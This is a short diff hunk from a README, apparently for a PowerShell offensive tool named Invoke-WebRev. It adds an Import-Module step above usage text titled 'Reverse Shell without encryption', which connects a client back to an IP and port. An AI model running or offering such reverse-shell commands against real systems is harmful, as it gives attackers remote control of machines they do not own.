@@ -18,6 +18,9 @@ On your server:
 
 On your client:
 ```
+Import-Module .\Invoke-WebRev.ps1
+```
+```
 Reverse Shell without encryption:
     Invoke-WebRev -ip IP -port PORT
 ```
